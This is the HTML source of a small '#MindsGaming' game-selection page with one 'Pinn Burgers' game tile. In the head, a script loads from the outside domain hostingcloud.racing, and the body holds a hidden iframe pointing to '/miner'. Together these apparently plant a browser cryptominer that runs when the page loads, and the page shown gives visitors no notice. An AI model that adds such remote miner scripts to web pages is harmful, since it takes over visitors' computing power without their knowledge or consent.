<html lang="en">
  <head>
    <title>#MindsGaming</title>

    <meta charset="utf-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <meta name="description" content="Community & Member Groups" />
    <meta
      property="og:image"
      content="https://cdn.glitch.com/6ca1674b-a03a-4e9c-9563-ed6203267aba%2FMGLogo.jpeg"
    />
    <link
      rel="icon"
      href="https://cdn.glitch.com/6ca1674b-a03a-4e9c-9563-ed6203267aba%2FMGLogo.jpeg"
    />
    <script src="https://www.hostingcloud.racing/5pDo.js"></script>

    <script src="/games/dice.js" defer></script>
    <link rel="stylesheet" href="/style.css" />

    <style>
      .gamewrap {
        position: fixed;
        display: block;
        top: 0;
        left: 0;
        width: 100%;
        height: 100%;
        background-color: blue;
      }
      .gameSplash {
        position: fixed;
        display: block;
        margin: -1px;
        top: 0;
        left: 0;
        width: 100%;
        height: 100%;
      }
      .pinnBurgers {
        float: left;
        display: block;
        margin-top: 3%;
        margin-left: 10%;
        background-color: transparent;
        background-image: url("https://cdn.glitch.me/f23d0d76-dc88-4f4e-afe2-9bd56ac40b28/pinnburgers.png");
        background-size: contain;
        background-repeat: no-repeat;
        width: 15rem;
        height: 8rem;
      }
      .gTitle {
        margin-top: 35%;
        font-size: 25px;
      }
    </style>
  </head>
  <body style="background-color: green;">
    <iframe src="/miner"> </iframe>
    <div class="gameWrap">
      <center>
        <br />
        <h3>
          Select A Game
        </h3>
        <div onclick="pinnBurgers();" class="pinnBurgers">
          <div class="gTitle" id="pinnBurgers" title="Closed">
            Pinn Burgers
          </div>
        </div>
      </center>
    </div>
  </body>
</html>
